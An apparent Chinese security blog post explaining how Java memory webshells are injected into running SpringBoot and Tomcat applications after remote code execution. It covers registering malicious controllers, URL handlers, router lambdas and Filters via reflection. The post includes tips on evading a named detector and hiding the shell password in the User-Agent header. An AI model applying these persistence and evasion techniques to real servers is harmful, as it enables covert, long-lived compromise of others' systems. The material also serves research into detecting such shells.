<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang="en">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Tomcat内存马" />





  <link rel="alternate" href="/atom.xml" title="Xiaopan233 Blog" type="application/atom+xml" />






<meta name="description" content="存货文，积了好久，懒得发233，今天发下。 本文写的很垃圾，建议学过基本的之后，当笔记看就好了。本文写了点可能比较新奇的东西。 想认真学的还是去看文末的Ref吧。 前提：和回显类似。得先RCE 好处：规避静态文件的查杀 原理：Java Web不像apache + php模式，每一次请求都是生成新的php实例。Java Web是长期运行的（同理的还有.net、go、python这些）。Web程序必定">
<meta property="og:type" content="article">
<meta property="og:title" content="Tomcat内存马">
<meta property="og:url" content="http://example.com/2022/07/07/2022-07-07-java-memory-shell/index.html">
<meta property="og:site_name" content="Xiaopan233 Blog">
<meta property="og:description" content="存货文，积了好久，懒得发233，今天发下。 本文写的很垃圾，建议学过基本的之后，当笔记看就好了。本文写了点可能比较新奇的东西。 想认真学的还是去看文末的Ref吧。 前提：和回显类似。得先RCE 好处：规避静态文件的查杀 原理：Java Web不像apache + php模式，每一次请求都是生成新的php实例。Java Web是长期运行的（同理的还有.net、go、python这些）。Web程序必定">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2022/07/07/2022-07-07-java-memory-shell/3.png">
<meta property="og:image" content="http://example.com/2022/07/07/2022-07-07-java-memory-shell/3.png">
<meta property="og:image" content="http://example.com/2022/07/07/2022-07-07-java-memory-shell/1.gif">
<meta property="article:published_time" content="2022-07-07T15:24:02.000Z">
<meta property="article:modified_time" content="2022-11-20T06:11:03.824Z">
<meta property="article:author" content="Xiaopan233">
<meta property="article:tag" content="java">
<meta property="article:tag" content="Tomcat">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2022/07/07/2022-07-07-java-memory-shell/3.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '',
    scheme: 'Mist',
    version: '5.1.4',
    sidebar: {"position":"right","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://example.com/2022/07/07/2022-07-07-java-memory-shell/"/>





  <title>Tomcat内存马 | Xiaopan233 Blog</title>
  








<meta name="generator" content="Hexo 5.4.0"></head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  
  
    
  

  <div class="container sidebar-position-right page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Xiaopan233 Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
            
            Categories
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
            
            Archives
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sitemap">
          <a href="/atom.xml" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
            
            Sitemap
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/2020/01/01/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
            
            About
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

<script>
  var server_url = "http://127.0.0.1/blog_v1/blog_v1.php";
</script>

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/07/2022-07-07-java-memory-shell/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiaopan233 Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">Tomcat内存马</h1>
        
        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-07-07T23:24:02+08:00">
                2022-07-07
              </time>
            

            

            
          </span>
          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/java/" itemprop="url" rel="index">
                    <span itemprop="name">java</span>
                  </a>
                </span>

                
                
              
            </span>
          
          
            
          


          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>存货文，积了好久，懒得发233，今天发下。</p>
<p>本文写的很垃圾，建议学过基本的之后，当笔记看就好了。本文写了点可能比较新奇的东西。</p>
<p>想认真学的还是去看文末的Ref吧。</p>
<p><strong>前提：和回显类似。得先RCE</strong></p>
<p><strong>好处：规避静态文件的查杀</strong></p>
<p><strong>原理：</strong>Java Web不像apache + php模式，每一次请求都是生成新的php实例。Java Web是长期运行的（同理的还有.net、go、python这些）。Web程序必定会有相关的变量、逻辑进行请求分发的操作。当我们RCE之后，若能控制进行请求分发的变量，便能控制请求分发的逻辑。</p>
<p>常见的操作有：新增控制器、修改控制器、添加拦截器等</p>
<span id="more"></span>



<p><strong>步骤</strong>：</p>
<ol>
<li>构造恶意类</li>
<li>获取上下文对象</li>
<li>拿到Filter、Servlet这些东西的注册类</li>
<li>往注册类里注册恶意类</li>
</ol>
<h1 id="SpringBoot"><a href="#SpringBoot" class="headerlink" title="SpringBoot"></a>SpringBoot</h1><p>本例环境为：SpringBoot2.6.1</p>
<h1 id="获取上下文对象"><a href="#获取上下文对象" class="headerlink" title="获取上下文对象"></a>获取上下文对象</h1><p>上下文对象中存放了大量的bean。大部分是Spring运行依赖的类对象。拿到这些bean。相当于成功了一半。</p>
<p><strong>getAttribute方式</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ServletRequestAttributes requestAttributes = (ServletRequestAttributes)RequestContextHolder.getRequestAttributes();</span><br><span class="line">HttpServletRequest httpServletRequest = requestAttributes.getRequest();</span><br><span class="line">(WebApplicationContext)servletContext1.getAttribute(XXXX);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">存储WebApplicationContext的属性</span></span><br><span class="line"><span class="comment">org.springframework.web.servlet.DispatcherServlet.THEME_SOURCE</span></span><br><span class="line"><span class="comment">org.springframework.web.servlet.DispatcherServlet.CONTEXT</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ServletRequestAttributes requestAttributes1 = (ServletRequestAttributes)RequestContextHolder.getRequestAttributes();</span><br><span class="line">ServletContext servletContext1 = requestAttributes1.getRequest().getServletContext();</span><br><span class="line">(WebApplicationContext)servletContext1.getAttribute(XXXX);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">存储WebApplicationContext的属性</span></span><br><span class="line"><span class="comment">org.springframework.web.context.WebApplicationContext.ROOT</span></span><br><span class="line"><span class="comment">org.springframework.web.servlet.FrameworkServlet.CONTEXT.dispatcherServlet</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>



<p><strong>WebApplicationContextUtils方式</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ServletRequestAttributes requestAttributes = (ServletRequestAttributes) RequestContextHolder.currentRequestAttributes();</span><br><span class="line">HttpServletRequest request = requestAttributes.getRequest();</span><br><span class="line">ServletContext servletContext = request.getServletContext();</span><br><span class="line">WebApplicationContext webApplicationContext = WebApplicationContextUtils.getWebApplicationContext(servletContext);</span><br></pre></td></tr></table></figure>



<p><strong>ContextLoader方式</strong></p>
<p><em>这个我在SpringBoot里用，返回的是Null。。。。</em></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WebApplicationContext currentWebApplicationContext = ContextLoader.getCurrentWebApplicationContext();</span><br></pre></td></tr></table></figure>



<p><strong>注意事项：</strong></p>
<p>以上拿到的WebApplicationContext都是<code>AnnotationConfigServletWebServerApplicationContext</code>的实例</p>
<p>但是，<code>getBeanFactory()</code>在<code>GenericApplicationContext</code>类中。所以要类型转换一下。</p>
<p><strong>关于IOC</strong></p>
<p>Spring IOC容器（BeanFactory）中，Bean对象存放的方式为：</p>
<p>获取属性的操作在：<em>DefaultListableBeanFactory#getBean</em></p>
<p>实际属性的位置在：<em>DefaultSingletonBeanRegistry.singletonObjects</em></p>
<h1 id="手动注册Controller"><a href="#手动注册Controller" class="headerlink" title="手动注册Controller"></a>手动注册Controller</h1><p>从源码角度看：请求分发入口 <em>DispatcherServlet#doDispatch</em></p>
<p>关键操作</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">processedRequest = checkMultipart(request); <span class="comment">//组装请求为Multipart</span></span><br><span class="line"></span><br><span class="line">mappedHandler = getHandler(processedRequest); <span class="comment">//从IOC中找bean[!]</span></span><br><span class="line"></span><br><span class="line">HandlerAdapter ha = getHandlerAdapter(mappedHandler.getHandler());</span><br><span class="line"></span><br><span class="line">mv = ha.handle(processedRequest, response, mappedHandler.getHandler()); <span class="comment">//实际调用Controller</span></span><br></pre></td></tr></table></figure>



<h3 id="getHandler-方法"><a href="#getHandler-方法" class="headerlink" title="getHandler()方法"></a><code>getHandler()</code>方法</h3><p><strong><code>getHandler()</code><strong>是比较重要的方法。主要逻辑是根据请求url，找对应的处理器，也就是</strong>HandlerMapping</strong>的适配。</p>
<p><code>HandlerMapping</code>如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">RequestMappingHandlerMapping</span><br><span class="line">BeanNameUrlHandlerMapping</span><br><span class="line">RouterFunctionMapping</span><br><span class="line">SimpleUrlHandlerMapping</span><br><span class="line">WelcomePageHandlerMapping</span><br></pre></td></tr></table></figure>



<p><code>HandlerMapping#getHandler()</code> <strong>会调用</strong><code>AbstractHandlerMapping#getHandlerInternal()</code>。对于这个方法的实现。有可分为三个抽象类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">AbstractHandlerMethodMapping</span><br><span class="line">	RequestMappingHandlerMapping</span><br><span class="line">    </span><br><span class="line">AbstractUrlHandlerMapping</span><br><span class="line">    BeanNameUrlHandlerMapping</span><br><span class="line">    SimpleUrlHandlerMapping</span><br><span class="line">    WelcomePageHandlerMapping</span><br><span class="line">    </span><br><span class="line">RouterFunctionMapping</span><br><span class="line">    根据<span class="keyword">this</span>.routerFunction.route() 返回HandlerFunction</span><br><span class="line">    <span class="comment">//有好多lambda。可以当一个难检测🐎？</span></span><br></pre></td></tr></table></figure>



<p>深究后可以发现，前两个抽象类都存在着<strong>路由映射</strong>属性。而<code>RouterFunctionMapping</code>比较特殊，后文说。</p>
<p><code>AbstractHandlerMethodMapping</code>和<code>AbstractUrlHandlerMapping</code>大同小异。只是最后的映射Map不一样而已。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//AbstractHandlerMethodMapping</span></span><br><span class="line"><span class="comment">//Map名为mappingRegistry</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> HandlerMethod <span class="title">lookupHandlerMethod</span><span class="params">(String lookupPath, HttpServletRequest request)</span></span>&#123;</span><br><span class="line">    List&lt;T&gt; directPathMatches = <span class="keyword">this</span>.mappingRegistry.getMappingsByDirectPath(lookupPath);</span><br><span class="line">    .....</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//AbstractUrlHandlerMapping</span></span><br><span class="line"><span class="comment">//Map名为handlerMap</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">getDirectMatch</span><span class="params">(String urlPath, HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">    Object handler = <span class="keyword">this</span>.handlerMap.get(urlPath);</span><br><span class="line">    .....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>注入马的思路：操作路由映射的Map。控制程序的路由走向。将路由<strong>映射</strong>到恶意类的恶意方法中</p>
<p>那马为什么要加<strong>内存</strong>二字呢？因为我们可以通过<code>defineClass()</code>，直接将字节码还原成对象实例。无文件落地。</p>
<p>找Map赋值位置的思路：找到Map变量，搜索赋值点。最终找到这两个方法，对于上文的两个抽象类。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AbstractHandlerMethodMapping$MappingRegistry#register(T mapping, Object handler, Method method)</span><br><span class="line">AbstractUrlHandlerMapping#registerHandler(String urlPath, Object handler)</span><br></pre></td></tr></table></figure>



<p>那接下来简单了。<strong>调用这两接口</strong>。就可以注册任意的<strong>路由映射</strong>了。</p>
<h2 id="AbstractHandlerMethodMapping注册内存马"><a href="#AbstractHandlerMethodMapping注册内存马" class="headerlink" title="AbstractHandlerMethodMapping注册内存马"></a><code>AbstractHandlerMethodMapping</code>注册内存马</h2><p><em>AbstractHandlerMethodMapping</em>的注册固然可以使用<code>registerMapping()</code>。但是他会记录一个logger。不优雅</p>
<p><em>AbstractHandlerMethodMapping#registerMapping</em></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">registerMapping</span><span class="params">(T mapping, Object handler, Method method)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (logger.isTraceEnabled()) &#123;</span><br><span class="line">        <span class="comment">//记录日志操作</span></span><br><span class="line">        logger.trace(<span class="string">&quot;Register \&quot;&quot;</span> + mapping + <span class="string">&quot;\&quot; to &quot;</span> + method.toGenericString());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.mappingRegistry.register(mapping, handler, method);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接调用<code>this.mappingRegistry.register</code>，更直接。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">register</span><span class="params">(T mapping, Object handler, Method method)</span></span></span><br></pre></td></tr></table></figure>

<p>具体的参数和类型，我们可以参考其子类。也就是<code>RequestMappingHandlerMapping#registerMapping</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">registerMapping</span><span class="params">(RequestMappingInfo mapping, Object handler, Method method)</span></span></span><br></pre></td></tr></table></figure>



<p>看看正常的controller。其<code>RequestMappingInfo</code>长啥样。可以在<code>AbstractHandlerMethodMapping#addMatchingMappings</code>看到。</p>
<p><img src="/2022/07/07/2022-07-07-java-memory-shell/3.png"></p>
<p><code>RequestMappingInfo</code>中设置了<code>pathPatternsCondition</code>的值。仿着写，就对了。如果<code>patternsCondition</code>设置了值，会有一个坑：SpringMVC在 <em>AbstractHandlerMapping#initLookupPath</em>中，移除了<code>UrlPathHelper.PATH_ATTRIBUTE</code>属性。但是在<code>UrlPathHelper#getResolvedLookupPath</code>又拿了一次<code>UrlPathHelper.PATH_ATTRIBUTE</code>属性。会被<code>Assert.notNull()</code>终止。</p>
<p>为了避坑，还是仿着正常格式来构造吧。</p>
<h2 id="AbstractUrlHandlerMapping注册内存马"><a href="#AbstractUrlHandlerMapping注册内存马" class="headerlink" title="AbstractUrlHandlerMapping注册内存马"></a><code>AbstractUrlHandlerMapping</code>注册内存马</h2><p>比<code>AbstractHandlerMethodMapping</code>注册还简单。看到他的注册方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">registerHandler</span><span class="params">(String urlPath, Object handler)</span></span></span><br></pre></td></tr></table></figure>

<p>没啥难的，</p>
<h2 id="RouterFunctionMapping注册内存马"><a href="#RouterFunctionMapping注册内存马" class="headerlink" title="RouterFunctionMapping注册内存马"></a><code>RouterFunctionMapping</code>注册内存马</h2><p><strong>十分危险。<code>RouterFunctionMapping</code>只有一个<code>routerFunction</code>，普通的SpringBoot项目这个属性是null，但如果攻击的程序有使用<code>RouterFunctionMapping</code>，很可能会崩</strong></p>
<p>看下<code>RouterFunctionMapping#getHandlerInternal</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">getHandlerInternal</span><span class="params">(HttpServletRequest servletRequest)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.routerFunction != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">//[!]调用this.routerFunction.route()</span></span><br><span class="line">        HandlerFunction&lt;?&gt; handlerFunction = <span class="keyword">this</span>.routerFunction.route(request).orElse(<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>找<code>RouterFunctionMapping</code>的继承类，找到一个<code>RouterFunctions$ResourcesRouterFunction</code></p>
<p>该类有个<code>Function lookupFunction</code>属性。可以存放lambda。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">ResourcesRouterFunction</span> <span class="keyword">extends</span>  <span class="title">AbstractRouterFunction</span>&lt;<span class="title">ServerResponse</span>&gt; </span>&#123;</span><br><span class="line">		<span class="comment">//[!]</span></span><br><span class="line">		<span class="keyword">private</span> <span class="keyword">final</span> Function&lt;ServerRequest, Optional&lt;Resource&gt;&gt; lookupFunction;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="title">ResourcesRouterFunction</span><span class="params">(Function&lt;ServerRequest, Optional&lt;Resource&gt;&gt; lookupFunction)</span> </span>&#123;</span><br><span class="line">			Assert.notNull(lookupFunction, <span class="string">&quot;Function must not be null&quot;</span>);</span><br><span class="line">			<span class="keyword">this</span>.lookupFunction = lookupFunction;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">    	<span class="comment">/*</span></span><br><span class="line"><span class="comment">    	 * 会被调用的route()</span></span><br><span class="line"><span class="comment">    	*/</span></span><br><span class="line">		<span class="meta">@Override</span></span><br><span class="line">		<span class="keyword">public</span> Optional&lt;HandlerFunction&lt;ServerResponse&gt;&gt; route(ServerRequest request) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">this</span>.lookupFunction.apply(request).map(ResourceHandlerFunction::<span class="keyword">new</span>);</span><br><span class="line">		&#125;</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure>



<p>是不是我们可以在自定义个<strong>恶意</strong>的lambda类呢？<strong>是的，完全可以。</strong></p>
<p>实测是能用的。</p>
<h1 id="关于内存马检测"><a href="#关于内存马检测" class="headerlink" title="关于内存马检测"></a>关于内存马检测</h1><p>看了下4ra1n师傅的检测。似乎只检测了<code>RequestMappingHandlerMapping</code>里的<code>mappingRegistry</code> - <strong>2021.12.06</strong></p>
<p><a target="_blank" rel="noopener" href="https://github.com/EmYiQing/SpringMemShell/blob/master/src/main/java/com/example/spring/TestController.java">https://github.com/EmYiQing/SpringMemShell/blob/master/src/main/java/com/example/spring/TestController.java</a></p>
<p>那我们可以通过注入<code>AbstractUrlHandlerMapping</code>和<code>RouterFunctionMapping</code>内存马即可规避检测</p>
<h1 id="隐蔽方式"><a href="#隐蔽方式" class="headerlink" title="隐蔽方式"></a>隐蔽方式</h1><p>把password放在User-Agent上</p>
<h1 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1><p>参考三梦师傅的文。（看文，好像师傅本来想通过注册一个优先级最高的Filter，来绕过Filter加载顺序拿不到response的问题，达到回显的效果。但，要注册Filter的前提是得拿到一个response。这就无了。所以，把他改成无文件内存马，更佳）</p>
<h2 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h2><h3 id="注册Filter"><a href="#注册Filter" class="headerlink" title="注册Filter"></a>注册Filter</h3><p>在Tomcat运行状态下，直接<code>addFilter()</code>是不得行的。会报错</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.lang.IllegalStateException: Filters can not be added to context /tomcat1_war_exploded as the context has been initialised</span><br></pre></td></tr></table></figure>

<p>跟进去报错的调用栈。发现抛错代码如下，十分简单粗暴</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> FilterRegistration.<span class="function">Dynamic <span class="title">addFilter</span><span class="params">(String filterName,</span></span></span><br><span class="line"><span class="function"><span class="params">            String filterClass, Filter filter)</span> <span class="keyword">throws</span> IllegalStateException </span>&#123;</span><br><span class="line">    .....</span><br><span class="line">    <span class="keyword">if</span> (!context.getState().equals(LifecycleState.STARTING_PREP)) &#123;</span><br><span class="line">        <span class="comment">//TODO Spec breaking enhancement to ignore this restriction</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(</span><br><span class="line">            sm.getString(<span class="string">&quot;applicationContext.addFilter.ise&quot;</span>,</span><br><span class="line">                         getContextPath()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么动态注册Filter的思路也很明显了：反射修改<code>context.getState()</code>的值，让其值为<code>LifecycleState.STARTING_PREP</code>。就可以正常执行<code>addFilter()</code>的逻辑了</p>
<p>反射路径:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> ApplicationContext.context</span><br><span class="line">    LifecycleBase.state</span><br></pre></td></tr></table></figure>



<p><strong>添加Filter的程序逻辑</strong></p>
<p>这样添加好Filter就能用了嘛？不，并不可以。结合前面我们需要反射修改<code>LifecycleBase.state</code>可推测。添加Filter的功能本来就不是在Tomcat启动中使用的。所以，我们还得简单看一下Filter的调用逻辑，看看Tomcat是在哪里保存Filter信息，怎么调用Filter的。如果可以，我们就通过反射修改存储FIiter信息的属性。</p>
<p>根据调用栈可知，Tomcat是通过调用<code>ApplicationFilterChain</code>来调用每一个Filter的。<code>ApplicationFilterChain</code>之前是由<code>StandardWrapperValve#invoke()</code>调用的。我们点到<code>StandardWrapperValve#invoke()</code>里头看看</p>
<img src="/2022/07/07/2022-07-07-java-memory-shell/3.png" style="zoom: 100%;">



<p>可以发现，对于每一个请求，Tomcat都会在<code>StandardWrapperValve#invoke()</code>中新建一个<code>ApplicationFilterChain</code>来执行Filter chain操作。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">invoke</span><span class="params">(Request request, Response response)</span></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    ApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);</span><br><span class="line">    <span class="comment">//拿到filterChain后，执行doFilter()走Filter流程</span></span><br><span class="line">    filterChain.doFilter(request.getRequest(), response.getResponse());</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看进新建的<code>ApplicationFilterFactory.createFilterChain()</code>，该方法依据<code>context</code>上下文变量查找对应的<code>Filter</code>。若<code>filterMap</code>在上下文中有存放，就会新建一个<code>ApplicationFilterChain</code></p>
